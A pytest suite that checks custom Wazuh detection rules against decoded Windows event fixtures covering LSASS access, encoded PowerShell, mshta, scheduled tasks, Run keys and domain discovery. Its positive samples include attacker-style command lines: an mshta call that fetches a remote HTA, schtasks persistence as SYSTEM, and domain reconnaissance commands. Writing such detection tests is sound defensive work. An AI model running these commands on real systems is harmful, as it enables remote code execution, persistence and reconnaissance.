"""Execute field patterns with PCRE2 on values decoded the way Wazuh 4.7 stores them.

Fixtures hold raw Windows values. wazuh_decoded() turns them into the form the
manager puts in win.* fields (backslashes doubled, quotes as \\", &<> as XML
entities), verified against wazuh-manager 4.7.5. These tests do not emulate
rule ancestry or correlation state; scripts/run_wazuh_fixtures.py
--transport eventchannel covers the real manager.
"""

import copy
import json
import sys
from pathlib import Path
from xml.etree import ElementTree

import pcre2
import pytest

ROOT = Path(__file__).parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
from run_wazuh_fixtures import wazuh_decoded  # noqa: E402

RULES = {rule.attrib["id"]: rule for rule in
         ElementTree.parse(ROOT / "detection-rules/custom-wazuh-rules.xml").getroot()}
CASES = [
    ("02-lsass-access.json", "100210", "targetImage", r"C:\Windows\System32\notepad.exe"),
    ("03-lsass-comsvcs.json", "100211", "commandLine", "rundll32.exe shell32.dll,Control_RunDLL"),
    ("04-ps-encoded.json", "100212", "commandLine", "powershell.exe -NoProfile Get-Date"),
    ("05-ps-network.json", "100213", "destinationIp", "127.0.0.1"),
    ("06-ps-iex-download.json", "100214", "scriptBlockText", "Write-Output 'hello'"),
    ("07-mshta-remote.json", "100220", "commandLine", r"mshta.exe C:\local.hta"),
    ("08-mshta-child.json", "100221", "parentImage", r"C:\Windows\explorer.exe"),
    ("09-archive-temp.json", "100232", "targetFilename", r"C:\Users\Public\note.txt"),
    ("10-registry-run.json", "100240", "targetObject", r"HKLM\Software\Example\Setting"),
    ("11-scheduled-task.json", "100241", "commandLine", "schtasks.exe /query"),
    ("12-discovery-whoami.json", "100250", "commandLine", "whoami /user"),
]


def decoded(value):
    if isinstance(value, dict):
        return {key: decoded(item) for key, item in value.items()}
    if isinstance(value, str):
        return wazuh_decoded(value)
    return value


def load(filename):
    return json.loads((ROOT / "infrastructure/docker/test-events" / filename).read_text())


def matches(rule_id, event):
    for field in RULES[rule_id].findall("field"):
        value = event
        for part in field.attrib["name"].split("."):
            value = value[part]
        if pcre2.search(field.text, str(value)) is None:
            return False
    return True


@pytest.mark.parametrize("filename,rule_id,field,benign", CASES)
def test_realistic_windows_path_and_benign_control(filename, rule_id, field, benign):
    event = load(filename)
    assert matches(rule_id, decoded(event)), f"{rule_id} misses a decoded Windows event"
    negative = copy.deepcopy(event)
    negative["win"]["eventdata"][field] = benign
    assert not matches(rule_id, decoded(negative))


def test_lsass_access_mask_requires_complete_value():
    event = load("02-lsass-access.json")
    event["win"]["eventdata"]["grantedAccess"] = "0x1410ff"
    assert not matches("100210", decoded(event))


def test_short_powershell_encoded_command_flag():
    event = load("04-ps-encoded.json")
    event["win"]["eventdata"]["commandLine"] = "powershell.exe -e " + "A" * 220
    assert matches("100212", decoded(event))


def test_fixtures_hold_raw_windows_values():
    # The manager doubles separators itself; a pre-doubled fixture would be
    # quadrupled and test a form no agent produces.
    for filename, *_ in CASES:
        for value in load(filename)["win"]["eventdata"].values():
            assert "\\\\" not in str(value), (filename, value)


def test_decoding_model_matches_wazuh_manager_4_7_5():
    # Raw command line and the exact win.eventdata.commandLine value that
    # wazuh-manager 4.7.5 stored for it in archives.json.
    raw = '"C:\\Windows\\system32\\whoami.exe" /groups & net group "Domain Admins" <x>'
    stored = '\\"C:\\\\Windows\\\\system32\\\\whoami.exe\\" /groups &amp; net group \\"Domain Admins\\" &lt;x&gt;'
    assert wazuh_decoded(raw) == stored


DISCOVERY_POSITIVES = [
    "whoami /groups",
    "whoami.exe /groups",
    r'"C:\Windows\system32\whoami.exe" /groups',
    r'"C:\Windows\system32\nltest.exe" /dclist:corp.example',
    "nltest /dclist:corp.example",
    'net group "Domain Admins" /domain',
    'net.exe group "Domain Admins" /domain',
    r'"C:\Windows\system32\net.exe" user "Domain Admins"',
    "net view /domain",
    "net session",
    "Get-ADUser -Filter *",
    "Get-ADComputer -Filter *",
]
DISCOVERY_NEGATIVES = [
    "whoami /user",
    "whoami.exe /user",
    "net use",
    r'"C:\Windows\system32\net.exe" use Z: \\fs01\share',
    "net user labuser",
    'net1 group "Domain Admins" /domain',
]


def discovery_event(command_line):
    return {"win": {"eventdata": {"commandLine": wazuh_decoded(command_line)}}}


@pytest.mark.parametrize("command_line", DISCOVERY_POSITIVES)
def test_discovery_matches_bare_exe_and_quoted_path(command_line):
    assert matches("100250", discovery_event(command_line))


@pytest.mark.parametrize("command_line", DISCOVERY_NEGATIVES)
def test_discovery_ignores_benign_commands(command_line):
    assert not matches("100250", discovery_event(command_line))


# Variants also confirmed on wazuh-manager 4.7.5 through --transport eventchannel.
QUOTED_VARIANTS = [
    ("07-mshta-remote.json", "100220", "commandLine",
     r'"C:\Windows\System32\mshta.exe" "http://192.168.30.30/a.hta"', True),
    ("07-mshta-remote.json", "100220", "commandLine", r'mshta.exe "C:\local\app.hta"', False),
    ("11-scheduled-task.json", "100241", "commandLine",
     r'schtasks.exe /create /tn x /tr "C:\Users\Public\u.exe" /sc daily', True),
    ("11-scheduled-task.json", "100241", "commandLine",
     r'schtasks.exe /create /tn x /tr "C:\Tools\b.exe" /ru "NT AUTHORITY\SYSTEM"', True),
    ("11-scheduled-task.json", "100241", "commandLine",
     r'schtasks.exe /create /tn x /tr "C:\Tools\backup.exe" /sc daily', False),
    ("09-archive-temp.json", "100232", "targetFilename",
     r"C:\Users\labuser\AppData\Local\Temp\data.7z", True),
    ("09-archive-temp.json", "100232", "targetFilename", r"C:\Users\labuser\Documents\data.zip", False),
    ("10-registry-run.json", "100240", "targetObject",
     r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\x", True),
]


@pytest.mark.parametrize("filename,rule_id,field,value,expected", QUOTED_VARIANTS)
def test_quoted_and_path_variants(filename, rule_id, field, value, expected):
    event = load(filename)
    event["win"]["eventdata"][field] = value
    assert matches(rule_id, decoded(event)) is expected
